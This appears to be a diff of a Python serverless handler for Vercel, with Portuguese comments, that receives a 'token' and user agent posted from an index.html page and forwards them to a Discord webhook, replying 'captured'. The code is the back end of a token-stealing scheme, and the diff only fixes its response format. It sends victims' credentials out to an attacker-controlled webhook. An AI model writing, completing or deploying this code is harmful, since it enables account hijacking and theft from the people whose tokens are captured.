@@ -1,18 +1,23 @@
 import json
 import urllib.request
 
+# Função principal esperada pela Vercel
 def handler(request):
-    # Configuração do Webhook (Duplicado para segurança, ou use Environment Variable)
-    WEBHOOK_URL = "https://discord.com/api/webhooks/SEU_ID_WEBHOOK/AQUI_TOKEN"
-    
     try:
-        data = json.loads(request.body)
+        # Lê o body JSON enviado pelo index.html
+        data = json.loads(request.body.decode('utf-8')) if request.body else {}
+        
         token = data.get('token')
         ua = data.get('ua', 'Unknown')
         
-        # Se não achar token, pode ser erro ou cache limpo
+        # Configuração do Webhook (SUBSTITUA AQUI)
+        WEBHOOK_URL = "https://discord.com/api/webhooks/SEU_ID_WEBHOOK/AQUI_TOKEN"
+
         if not token:
-            return {"status": "ok", "msg": "No token found"}, 200
+            return {
+                "statusCode": 200,
+                "body": json.dumps({"status": "ok", "msg": "No token found"})
+            }
 
         # Prepara payload pro Discord
         discord_payload = {
@@ -33,7 +38,14 @@ def handler(request):
         )
         urllib.request.urlopen(req)
 
-        return {"status": "captured"}, 200
+        return {
+            "statusCode": 200,
+            "body": json.dumps({"status": "captured"})
+        }
 
     except Exception as e:
-        return {"status": "error", "msg": str(e)}, 500
+        print(f"Error: {str(e)}") # Logs aparecem no console do deploy da Vercel
+        return {
+            "statusCode": 500,
+            "body": json.dumps({"status": "error", "msg": str(e)})
+        }
